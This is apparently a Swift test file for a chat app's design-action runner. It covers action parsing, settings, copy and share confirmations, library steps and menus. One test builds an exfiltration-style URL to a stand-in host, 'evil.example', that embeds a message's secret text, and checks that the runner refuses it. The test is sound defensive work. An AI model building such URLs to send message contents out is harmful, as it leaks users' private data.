import Foundation
import Testing
@testable import M5Design

/// The action vocabulary (Actions.java's switch) and the runner's own logic.
@Suite struct DesignActionTests {
    static func p(_ name: String, _ arg: DesignValue? = nil, computed: Bool = false) -> DesignAction? { DesignAction.parse(name, value: arg, computed: computed) }

    @Test func argumentsAreReadAsAndroidReadsThem() {
        #expect(Self.p("screen.open") == .screenOpen("rooms"))
        #expect(Self.p("screen.open", "about") == .screenOpen("about"))
        #expect(Self.p("menu.open", "") == .menuOpen("main"))
        #expect(Self.p("room.switch", "") == nil)
        #expect(Self.p("room.switch", "team") == .roomSwitch("team"))
        #expect(Self.p("room.leave") == .roomLeave(""))
        #expect(Self.p("users.dock") == .usersDock("right"))
        #expect(Self.p("users.autoHide") == .usersAutoHide(nil))
        #expect(Self.p("users.autoHide", true) == .usersAutoHide(true))
        #expect(Self.p("users.autoHide", 0) == .usersAutoHide(false))
        #expect(Self.p("users.autoHide", "false") == .usersAutoHide(true)) // a text is truthy, as on Android
        #expect(Self.p("lang.set", "system") == .langSet(""))
        #expect(Self.p("lang.set", "sk") == .langSet("sk"))
        #expect(Self.p("lang.set", "pl") == nil)
        #expect(Self.p("fn.run", "help") == nil)
        #expect(Self.p("fn.run", "/help me") == .fnRun("/help me"))
        #expect(Self.p("set", "name= Mike ") == .setForm(name: "name", value: " Mike "))
        #expect(Self.p("set", "=x") == nil)
        #expect(Self.p("setting.set", " voice.rate = 1.2 ") == .settingSet(key: "voice.rate", value: "1.2"))
        #expect(Self.p("setting.set", "voice.rate") == nil)
        #expect(Self.p("setting.toggle", " look.haptics ") == .settingToggle("look.haptics"))
        #expect(Self.p("look.set", "look.font = serif") == .lookSet(key: "look.font", value: "serif"))
        #expect(Self.p("voice.speak", "") == nil)
        #expect(Self.p("nfc.reader", "usb") == .nfcReader("usb"))
        #expect(Self.p("nfc.reader", "wifi") == nil)
        #expect(Self.p("account.signout", "everywhere") == .accountSignOut(everywhere: true))
        #expect(Self.p("account.signout") == .accountSignOut(everywhere: false))
        #expect(Self.p("copy", "x", computed: true) == .copy("x", computed: true))
        #expect(Self.p("msg.info", 12) == .msgInfo("12"))
        #expect(Self.p("teleport", "x") == .unknown("teleport"))
        #expect(DesignAction.dangerous("room.delete") && DesignAction.dangerous("wipe.ask") && !DesignAction.dangerous("room.leave"))
    }

    @Test func everyCatalogueActionIsTyped() {
        #expect(ActionCatalog.entries.count == 122)
        #expect(Set(ActionCatalog.names).count == 122)
        for e in ActionCatalog.entries {
            // with an argument most actions want, none is unknown
            let parsed = DesignAction.parse(e.action, value: "x=1")
            if case .unknown? = parsed { Issue.record("\(e.action) is not typed") }
            let bare = DesignAction.parse(e.action, value: nil)
            if case .unknown? = bare { Issue.record("\(e.action) is not typed") }
        }
    }
}

@MainActor
final class MockHost: ActionHost {
    var design: Design
    var translator: Translator
    var settings = SettingsModel()
    var form: [String: DesignValue] = [:]
    var isDark = false
    var shown: String?
    var flashes: [String] = []
    var refreshes = 0
    var changed: [String] = []
    var lookChanges = 0
    var languages: [String] = []
    var opened: [URLConfirmation] = []
    var shareAsks: [ShareConfirmation] = []
    var copied: [String] = []
    var shared: [String] = []
    var performed: [DesignAction] = []
    var logs: [String] = []

    init(design: Design = Fixtures.builtIn) {
        self.design = design
        translator = Translator { "[\($0)]" }
    }

    func shownUsername() -> String? { shown }
    func flash(title: String, text: String, level: FlashLevel) { flashes.append(text) }
    func refresh() { refreshes += 1 }
    func settingChanged(_ key: String) { changed.append(key) }
    func lookChanged() { lookChanges += 1 }
    func languageChanged(_ lang: String) { languages.append(lang) }
    func confirmOpen(_ request: URLConfirmation) { opened.append(request) }
    func confirmShare(_ request: ShareConfirmation) { shareAsks.append(request) }
    func copy(_ text: String) { copied.append(text) }
    func share(_ text: String) { shared.append(text) }
    func perform(_ action: DesignAction, source: ActionSource?) { performed.append(action) }
    func log(_ level: FlashLevel, _ message: String) { logs.append(message) }
}

@MainActor
@Suite struct ActionRunnerTests {
    static let scope = Scope(["msg": .obj(["text": "the secret plaintext", "id": "m1"]), "value": 1.5, "room": .obj(["key": "team"])])

    func run(_ host: MockHost, _ action: String, _ raw: String?, depth: Int = 0) -> ActionOutcome {
        let runner = ActionRunner(host: host)
        let value = raw.map { (try? Expr.value($0, Self.scope, host.translator)) ?? .null }
        return runner.run(action, raw: raw, value: value, scope: Self.scope, depth: depth)
    }

    @Test func aRefusalFlashesAndRunsNothing() {
        let h = MockHost()
        #expect(run(h, "url.open", "https://evil.example/{$msg.text}") == .refused(.computed))
        #expect(h.flashes == ["[security.refused]"])
        #expect(h.opened.isEmpty && h.performed.isEmpty)
        #expect(!h.logs.contains { $0.contains("secret") })
        #expect(run(h, "setting.set", "calls.logName=people") == .refused(.privacy))
        #expect(h.settings.str("calls.logName") == "app")
    }

    @Test func urlOpenAsksFirstAndRefusesWhatCannotBeRead() {
        let h = MockHost()
        #expect(run(h, "url.open", "https://help.example/android") == .handled)
        #expect(h.opened == [URLConfirmation(url: "https://help.example/android", title: "help.example", confirm: "[msg.open]", cancel: "[nav.close]")])
        #expect(run(h, "url.open", "https://help.example/a b") == .refusedURL)
        #expect(h.flashes == ["[security.urlRefused]"])
    }

    @Test func copyAndShareConfirmComputedTexts() {
        let h = MockHost()
        let runner = ActionRunner(host: h)
        #expect(run(h, "copy", "{_'help.text'}") == .handled)
        #expect(h.copied == ["[help.text]"] && h.flashes == ["✓"])
        #expect(run(h, "share", "Look: {$msg.text}") == .handled)
        #expect(h.shared.isEmpty)
        let ask = h.shareAsks[0]
        #expect(ask.share && ask.text == "Look: the secret plaintext" && ask.title == "[security.shareAsk]" && ask.confirm == "[security.shareGo]")
        runner.confirmed(ask)
        #expect(h.shared == ["Look: the secret plaintext"])
        let long = Scope(["t": .string(String(repeating: "x", count: 2001))])
        #expect(runner.run("copy", raw: "{$t}", value: .string(String(repeating: "x", count: 2001)), scope: long) == .refusedShareTooLong)
        #expect(h.flashes.last == "[security.shareTooLong]")
        #expect(runner.run("copy", raw: "{$missing}", value: "", scope: .empty) == .ignored)
    }

    @Test func settingsFormAndLook() {
        let h = MockHost()
        #expect(run(h, "setting.set", "voice.rate={$value}") == .handled)
        #expect(h.settings.num("voice.rate") == 1.5)
        #expect(h.changed == ["voice.rate"] && h.refreshes == 1)
        #expect(run(h, "setting.set", "voice.rate=9") == .refused(.outside))
        #expect(run(h, "setting.toggle", "messages.enterSends") == .handled)
        #expect(h.settings.bool("messages.enterSends"))
        #expect(run(h, "set", "name={$room.key}") == .handled)
        #expect(h.form["name"] == "team")
        #expect(run(h, "look.set", "look.buttons=tonal") == .handled)
        #expect(h.settings.str("look.buttons") == "tonal" && h.lookChanges == 1)
        #expect(run(h, "look.reset", nil) == .handled)
        #expect(h.settings.str("look.buttons") == "filled")
        h.isDark = true
        #expect(run(h, "theme.toggle", nil) == .handled)
        #expect(h.settings.str("appearance.tone") == "light")
        #expect(run(h, "nfc.reader", "bluetooth") == .handled)
        #expect(h.settings.str("nfc.reader") == "bluetooth")
        #expect(run(h, "lang.set", "fi") == .performed(.langSet("fi")))
        #expect(h.languages == ["fi"])
        #expect(run(h, "call.speaker", nil) == .performed(.callSpeaker))
        #expect(h.settings.bool("calls.speaker") == false)
    }

    @Test func everythingElseGoesToTheApp() {
        let h = MockHost()
        #expect(run(h, "msg.info", "{$msg.id}") == .performed(.msgInfo("m1")))
        #expect(run(h, "room.switch", "") == .ignored)
        #expect(run(h, "teleport", nil) == .unknown("teleport"))
        #expect(h.performed == [.msgInfo("m1")])
        #expect(h.logs.contains("unknown action teleport"))
    }

    @Test func librariesRunTheirStepsAndNeverNest() {
        let lib = DesignLibrary(description: "", steps: [
            LibraryStep(action: "set", arg: "a=1"),
            LibraryStep(action: "screen.open", arg: "{$room.key}", condition: "$value > 1"),
            LibraryStep(action: "screen.open", arg: "never", condition: "$value > 100"),
            LibraryStep(action: "lib.run", arg: "inner"),
            LibraryStep(action: "url.open", arg: "{$msg.text}"),
            LibraryStep(action: "lock.now"),
        ])
        var doc = Fixtures.builtIn.document
        doc.libraries["outer"] = lib
        doc.libraries["inner"] = DesignLibrary(description: "", steps: [LibraryStep(action: "lock.now")])
        doc.libraries["broken"] = DesignLibrary(description: "", steps: [LibraryStep(action: "set", arg: "b=1"), LibraryStep(action: "set", arg: "{$x"), LibraryStep(action: "lock.now")])
        doc.libraries["many"] = DesignLibrary(description: "", steps: Array(repeating: LibraryStep(action: "back"), count: 70))
        let h = MockHost(design: Design.fromDocument(doc))
        #expect(run(h, "lib.run", "outer") == .handled)
        #expect(h.form["a"] == "1")
        #expect(h.performed == [.screenOpen("team"), .lockNow])     // the nested lib.run did nothing, url.open was refused
        #expect(h.logs.contains("a library cannot run another library"))
        #expect(h.flashes == ["[security.refused]"])
        h.performed = []
        #expect(run(h, "lib.run", "broken") == .handled)
        #expect(h.form["b"] == "1" && h.performed.isEmpty)            // a broken step stops the library
        #expect(run(h, "lib.run", "many") == .handled)
        #expect(h.performed.count == 60)
        #expect(run(h, "lib.run", "{$msg.text}") == .refused(.computed))
        _ = run(h, "lib.run", "nope")
        #expect(h.logs.contains("no library nope"))
    }

    @Test func commitsWriteTheSettingOrTheFormThenRunChange() {
        let h = MockHost()
        let runner = ActionRunner(host: h)
        // the user's own switch may change a privacy setting
        runner.commit(ValueBinding(setting: "location.track", bind: nil, change: nil, scope: .empty), value: true)
        #expect(h.settings.bool("location.track") && h.changed == ["location.track"])
        runner.commit(ValueBinding(setting: "appearance.preset", bind: nil, change: nil, scope: .empty), value: "nord")
        #expect(h.settings.str("appearance.preset") == "nord" && h.lookChanges == 1)
        runner.commit(ValueBinding(setting: nil, bind: "pick", change: EventHandler(action: "setting.set", arg: "voice.rate={$value}"), scope: .empty), value: 2)
        #expect(h.form["pick"] == 2 && h.settings.num("voice.rate") == 2)
        runner.inputChanged(bind: "q", text: "hi")
        #expect(h.form["q"] == "hi")
    }

    @Test func menusAndSwipeRowsFire() throws {
        let h = MockHost()
        let runner = ActionRunner(host: h)
        let resolver = ScreenResolver(RenderContext(design: Fixtures.builtIn, dark: false, translator: h.translator))
        let items = try resolver.menu("main", scope: Scope(["account": .obj(["signedIn": false])]))
        #expect(!items.contains { $0.id == "profile" })
        #expect(items.contains { $0.id == "register" })
        let settings = try #require(items.first { $0.id == "settings" })
        #expect(settings.label == "[menu.settings]")
        #expect(runner.fire(settings) == .performed(.screenOpen("settings")))
        let signedIn = try resolver.menu("main", scope: Scope(["account": .obj(["signedIn": true])]))
        #expect(signedIn.contains { $0.id == "profile" } && !signedIn.contains { $0.id == "register" })
        #expect(try resolver.menu("nope", scope: .empty).isEmpty)
    }
}
